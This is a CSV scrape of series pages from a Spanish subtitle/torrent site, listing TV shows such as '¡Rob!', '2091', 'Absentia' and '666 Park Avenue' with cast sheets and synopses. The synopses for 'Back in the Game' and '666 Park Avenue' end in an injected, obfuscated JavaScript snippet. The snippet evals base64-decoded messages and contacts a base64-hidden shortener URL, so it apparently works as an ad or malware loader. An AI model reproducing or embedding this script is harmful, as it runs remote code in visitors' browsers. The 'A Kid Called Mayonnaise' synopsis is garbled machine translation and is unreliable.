Series main_page_url,Series name,Ficha tecnica,Resumen
https://www.subtorrents1.com/series/rob/,¡Rob!,"
                       Título Original: Rob
Creador: Lew Morton
Producción Ejecutiva: Eric Tannenbaum, Kim Tannenbaum, Lew Morton y Rob Schneider
Estudio: CBS Television Studios
Género: Comedia
Temporada: 1ª 
Episodios: 8
Fecha de estreno: 12 de enero de 2012
Distribución Paramount
Horario de emisión Jueves 8.30 p.m.

Reparto:
Rob Schneider ... Rob
Claudia Bassols ... Maggie
Diana Maria Riva ... Rosa
Cheech Marin ... Fernando
Lupe Ontiveros ... Abuelita
Eugenio Derbez ... Hector						","
Descripcion
Rob es una comedia basada ligeramente en la vida real del actor Rob Schneider, un chico solitario y eterno soltero que, después de una corta relación sentimental, se casa con su novia latina y entra a formar parte de una extravagente familia mexicano-americana. Tras conocerla en un encuentro casual y comprometerse en tiempo récord, este arquitecto paisajístico decide poner fin a su estatus de soltero y se casa con una atractiva mujer llamada Maggie. A partir de ahí, empezará lo más díficil. Tendrá que ganarse a la sobreprotectora familia de Maggie, un clan latino que no está muy contento con dicha unión. Y es que cuando te casas con una chica, realmente te casas con toda su familia. ¡Prepárate para este gran choque cultural!
Rob (Rob Schneider, Gigoló) es un exitoso arquitecto paisajístico que, después de un frenético romance, se casa con Maggie (Claudia Bassols, Gavilanes), una atractiva y encantadora propietaria de una tienda de moda, que a simple vista parece demasiado para él. Maggie no le ha contado nada de su boda express en Las Vegas a nadie de su extensa familia latina. Pero ahora ella insiste en que Rob conozca formalmente a sus padres y familiares, arruinando sus planes de quedarse en casa y ""tener sexo todo el día"". El problema para ambos es que la familia de Maggie no recibirá a Rob todo lo bien que hubiesen deseado.
"
https://www.subtorrents1.com/series/back-in-the-game/,Back in the Game,"
                       Título original: Back in the Game
Año: 2013
Duración: 22 min.
País: Estados Unidos
Director: Mark Cullen (Creator),  Robb Cullen (Creator),  Glenn Ficarra,  John Requa
Guión: Mark Cullen, Robb Cullen
Música: Michelle Kuznetsky
Productora: 20th Century Fox Television / Kapital Entertainment Género: Comedia | Sitcom. Deporte. Béisbol
Temporada: 1
Capítulos: 13

Reparto:
Maggie Lawson,  
James Caan,  
Lenora Crichlow,  
David Stanford,  
Benjamin Koldyke,  
Griffin Gluck,  
J.J. Totah,  
Shaun Rylee,  
Michelle Betts,  
Kennedy Waite,  
Cooper Roth,  
James Blakely,  
Brandon Salgado,  
Alvin Cowan 

","
Descripcion
Se centra en Terry Gannon, una madre soltera recientemente divorciada que se traslada temporalmente a vivir con su padre separado, un ex jugador de béisbol, bebedor de cerveza. A regañadientes empieza como entrenadora del desamparado equipo de su hijo y vuelve a introducirse en el mundo del deporte que había prometido dejar atrás.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/2091/,2091,"
                       Título original
    2091: Jugar o morir (TV Series) 
Año
    2016
Duración
    60 min.
País
    Colombia Colombia
Director
    Felipe Martínez Amador, Álvaro Curiel 
Guion
    Andrés Gelós, Constanza Cabrera, Lucila Podestá, Luis E. Langlemey, Natacha Caravia, Martín Preusche
Música
    Emilio Kauderer
Fotografía
    Diego Jiménez
Reparto
    Manolo Cardona, Angie Cepeda, Benjamín Vicuña, Luz Cipriota, Ludovico Di Santo, Flora Martínez, José Restrepo, Christopher Von Uckermann, Natalia Reyes, Julio Bracho, Damián Alcázar, Cristina Rodlo, Jason Day, Salvador del Solar, Geraldine Zivic, Tim Janssen, María Barreto, Roberto San Martín, Claudio Cataño, Jean Paul Leroux, Liseth Bitar, Gonzalo Vivanco, Karen Carreno, Alejandra Buitrago, María Cecilia Sánchez 
Productora
    Coproducción Colombia-Argentina; Fox Telecolombia / Fox International Channels
Género
    Serie de TV. Ciencia ficción. Acción. Thriller | Videojuego. Distopía 						","
Descripcion
el comportamiento de la humanidad ha llevado los recursos del planeta a un punto de agotamiento tal que sus habitantes se ven obligados a buscar alternativas para asegurar su supervivencia. Los mejores siete jugadores de Nueva Manaos son reclutados por la Corporación Neodimio para jugar una partida extrema en la luna terraformada de Calisto. A bordo de ""Colonus"", que es a la vez nave y consola de videojuego, compiten entre sí por un lugar de privilegio en el bienestar de Ciudad Destino. Pero todo cambiará cuando Ferrán (Manolo Cardona), descubre la siniestra verdad que se esconde detrás de todo esto.
"
https://www.subtorrents1.com/series/a-kid-called-mayonnaise/,A Kid Called Mayonnaise,"
                       Título original
A Kid Called Mayonnaise
Fecha de lanzamiento
Sep. 01, 2017
Última transmisión
Sep. 01, 2017
Temporadas
1
Estado
Pilot 						","
Descripcion
Cuando un niño de un pueblo pequeño, Mayo Davis, se trasladó a Los Ángeles, él sabía que ayudaba a su madre ejecutar un motel sería emocionante. Lo que no sabía era lo solo que sería. Por eso, cuando una misteriosa chica impulsa mediante un flotador en el desfile y las olas en la Clínica Mayo, se embarca en una épica búsqueda y surrealista para encontrarla, sólo para descubrir que él tiene que hacer una elección entre hacer un amigo y hacer un soporte.
"
https://www.subtorrents1.com/series/a-place-to-call-home/,A Place To Call Home,"
                       Título Original: A Place To Call Home
Creador: Bevan Lee
Productor ejecutivo: John Holmes, Julie McGauran
Productor: Chris Martin-Jones
Location: Sydney, Nueva Gales del Sur, Australia
País: Australia
Idioma: Inglés
Género: Drama de época

Temporada: 1
Capítulos: 13

Temporada: 2
Capítulos: 10

Reparto:

Marta Dusseldorp ... Sarah Adams 
Noni Hazlehurst ... Elizabeth Bligh 
Brett Climo ... George Bligh 
Frankie J. Holden ... Roy Briggs 
David Berry ... James Bligh 
Arianwen Parkes-Lockwood ... Olivia Bligh 
Craig Hall ... el Dr. Jack Duncan 
Abby Earl ... Anna Bligh 
Aldo Mignone ... Gino Poletti 
Adam Gray ... Rene 
Dominic Allburn ... Harry Polson 
Vanessa Buckley ... enfermera Milly 
Rupert Degas ... Padre Patrick						","
Descripcion
La serie está ubicada después de la Segunda Guerra Mundial y se centra en Elizabeth Bligh la matriarca de la familia Bligh, cuyo hijo George controla los intereses de la empresa familiar, después de perder a su esposa Elaine George cree que nunca va a sentirse atraído por otra persona hasta que conoce a Sarah Adams, un mujer con un pasado misterioso que entra en su vida para el enojo de Elizabeth.4 George es padre de Jamie, un joven que tuvo que casarse con Olivia sin amarla por decreto de su abuela y Anna, una joven que tiene que esconder su amor por Gino, un joven que trabaja en las tierras de su familia y a quien conoce desde pequeño. A ellos se les unen Roy Briggs, un hombre que pierde su encanto luego de la muerte de su esposa e hijos y Jack Duncan, un médico y el protegido de Elizabeth.
"
https://www.subtorrents1.com/series/absentia/,Absentia,"
                       Título original
    Absentia (TV Series) 
Año
    2017
Duración
    60 min.
País
    Estados Unidos Estados Unidos
Director
    Gaia Violo (Creator), Matt Cirulnick (Creator) 
Guion
    Matt Cirulnick, Elaina Perpelitt, Kate Powers, Antoinette Stella, Gaia Violo
Reparto
    Stana Katic, Patrick Heusinger, Richard Brake, Bruno Bichir, Cara Theobold, Amber Aga, Angel Bonanni, Paul Freeman, Ralph Ineson, Neil Jackson, Patrick McAuley, Nick Cornwall, J.R. Esposito, Nathan Wiley 
Productora
    Masha Productions
Género
    Serie de TV. Thriller. Drama 						","
Descripcion
Mientras persigue a un asesino en serie, una agente del FBI desaparece y es dada por muerta, dejando solos a su marido, también agente, y a su hijo de 3 años. Pero 6 años después reaparece para sorpresa de todos. Sin recordar nada de lo sucedido desde su secuestro, tiene que adaptarse a una nueva realidad en la que su marido ha rehecho su vida con otra mujer y su hijo no la conoce. Además, una nueva serie de asesinatos hacen pensar a algunos de sus compañeros que ella podría ser la autora.
"
https://www.subtorrents1.com/series/24-legacy/,24: Legacy,"
                       Título original: 24: Legacy
Año: 2017
País: Estados Unidos
Director: Robert Cochran (Creator), Joel Surnow (Creator), Stephen Hopkins
Guion: Robert Cochran, Manny Coto, Howard Gordon, Evan Katz, Joel Surnow
Música: Sean Callery
Fotografía: Jeffrey C. Mygatt, Peter Levy
Productora: 20th Century Fox Television / Fox / Imagine Television
Género: Acción. Drama. Suspenso

Capítulos: 12


Reparto:

Corey Hawkins ... Eric Carter
Miranda Otto ... Rebecca Ingram
Teddy Sears ... Keith Mullins
Ashley Thomas ... Isaac Carter
Dan Bucatinsky ... Andy Shalowitz
Charlie Hofheimer ... Ben Grimes
Sheila Vand ... Nilaa Mizrani
Jimmy Smits ... John Donovan						","
Descripcion
Eric Carter, un veterano de guerra con un duro pasado que regresa a casa, a los brazos de su esposa Nicole, y debe trabajar uniendo fuerzas con con el CTU (Unidad Contra Terrorista), poniéndose bajo las órdenes de Rebecca Ingram, una antigua jefa del CTU, casada con un senador de nombre John Donovan. 
24: Legacy es una nueva entrega dentro de la franquicia creada a partir de la serie de televisión protagonizada por Kiefer Sutherland en el papel del mítico agente federal Jack Bauer. Esta nueva serie está protagonzada por Corey Hawkins (Straight Outta Compton) y la actriz australiana Miranda Otto (Eowyn en la trilogía de El Señor de los Anillos). La producción de Fox mantiene el mismo formato de tiempo real que su predecesora y cuenta con 12 episodios para cubrir los eventos que suceden en un solo día. 
Evan Katz y Manny Coto escriben y producen este spin-off, en el que están acompañados por los productores ejecutivos Howard Gordon y Brian Grazer.
"
https://www.subtorrents1.com/series/666-park-avenue/,666 Park Avenue,"
                       Título Original: 666 Park Avenue
Creadora: David Wilcox
Producción Ejecutiva: Alex Graves, David Wilcox, Gina Girolamo, Leslie Morgenstein y Matt Miller
Estudio: Warner Bros. Television
Género: Drama
Temporada: 1ª
Episodios: 13
Fecha de estreno: 30 de septiembre de 2012
Distribución: Warner
Horario de emisión: Domingos 10.00 p.m.

Reparto:
Rachael Taylor ... Jane Van Veen
Dave Annable ... Henry Martin
Terry O'Quinn ... Gavin Doran
Vanessa Williams ... Olivia Doran
Mercedes Masöhn ... Louise Leonard
Robert Buckley ... Brian Leonard
Helena Mattsson ... Alexis Blume
Erik Palladino ... Tony DeMeo
Samantha Logan ... Nona Clark						","
Descripcion
¿Qué estarías dispuesto a hacer para conseguir todo lo que deseas? Estás invitado a entrar en 666 Park Avenue, una de las direcciones más seductoras de la ciudad de Nueva York. Todo el mundo tiene necesidades acuciantes, deseos y ambiciones. Para los residentes de The Drake, uno de los edificios de apartamentos más lujosos del Upper East Side de Manhattan, todo ello está al alcance de sus manos, por un módico precio, gracias a la cortesía del misterioso dueño de inmueble. Sexy, seductor y acogedor, The Drake mantiene un oscuro control sobre sus inquilinos, alimentando sus ambiciones y deseos. Pero cuidado con lo que deseas, porque el precio que tendrán que pagar por ello es… tu alma.
Bienvenido a The Drake, un aparentemente normal edificio de apartamentos, en donde el mal, la obsesión y los sucesos paranormales están incluidos en el alquiler. En él, todo lo que deseas puede ser tuyo, cortesía de su misterioso propietario, Gavin Doran (Terry O'Quinn, Perdidos). Pero todo contrato de este tipo tiene un precio. Y eso es lo que están a punto de averiguar Jane Van Veen (Rachael Taylor, Los ángeles de Charlie) y Henry Martin (Dave Annable, Cinco hermanos), una joven e idealista pareja que acaba de llegar a la glamurosa Nueva York, en donde se les ofrece la oportunidad de ser los administradores del histórico inmueble. Jane es una chica de pueblo con grandes ambiciones, siempre quiso ser arquitecta. Henry, miembro del equipo del alcalde, es sensato, inteligente y tenaz. Ambos se han visto arrastrados por el intoxicante estilo de vida de la élite de la ciudad.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/acceptable-risk/,Acceptable Risk,"
                       Título original
    Acceptable Risk 
Año
    2017
País
    Irlanda Irlanda
Dirección
    Kenneth Glenaan, Christian Langlois 
Guion
    Ron Hutchinson
Música
    Michel Corriveau
Fotografía
    Tim Fleming
Reparto
    Elaine Cassidy, Morten Suurballe, Angeline Ball, Lisa Hogg, Geordie Johnson, Paul Popowich, Risteard Cooper, Kate Moran, Rory Nolan, Gloria Cramer Curtis, Elijah O'Sullivan, Dearbhla Molloy, Catherine Walker, Karen Ardiff 
Productora
    Acorn Media Enterprises / RTÉ
Género
    Thriller | Miniserie de TV 						","
Descripcion
Sarah era una brillante abogada en una multinacional farmacéutica, puesto que abandonó voluntariamente para dedicarse a criar a sus dos hijos, pero la tragedia le persigue tras perder a su primer marido y padre de sus hijos, en un extraño accidente hace tres años, poco después que ella abandonará la empresa. Tras enderezar su situación personal con Lee, otro ejecutivo de la misma multinacional, sufre otro enorme mazazo, cuando descubren el cadáver de Lee en un barrio de mala muerte de Montreal, brutalmente asesinado en la ciudad donde se encontraba en viaje de negocios.
Sarah va descubriendo poco a poco no solo la verdad sobre su compañero Lee sino sobre la multinacional farmacéutica, lo que le obliga a emprender su cruzada personal para esclarecer todo, caiga quien caiga, con grave riesgo para ella y su familia.
"
https://www.subtorrents1.com/series/100-code/,100 Code,"

Título original
    The Hundred Code (TV Series)aka 
Año
    2015
País
    Suecia Suecia
Director
    Jonathan Sjöberg, Robert Moresco, Lisa James-Larsson, Andreas Öhman 
Guion
    Amanda Moresco, P.J. Hennigan, Robert Moresco, Allan Steele, Bill Tangradi, Michael Yebba
Música
    Adam Nordén
Fotografía
    Ulf Brantas
Reparto
    Michael Nyqvist, Dominic Monaghan, Felice Jankell, Charlotta Jonsson, Kristoffer Berglund, Peter Eggers, Danilo Bejarano, Jenny Hutton, Hedda Stiernstedt, Roisin Murphy, Johanna Hedberg, Christian Svensson, Sara Zommorodi, Jason Furlani 
Productora
    Coproducción Suecia-Alemania; Fabrik Entertainment / Red Arrow International / Sky / SBS Discovery
Género
    Serie de TV. Thriller | Crimen 						","
Descripcion
Tommy Conley (Dominic Monaghan), un detective de Nueva York, es enviado a Suecia para observar y asesorar a la policía local en la investigación. Se une el sueco Mikael Eklund (Michael Nyqvist), un veterano de homicidios que trabaja de acuerdo con las reglas. Extremadamente nacionalista, Mikael no acoge con satisfacción la presencia de Conley, se encarga de criticar la cultura americana cada vez que puede. Aunque los dos no se soportan, ellos necesitan encontrar una manera de trabajar juntos.
"
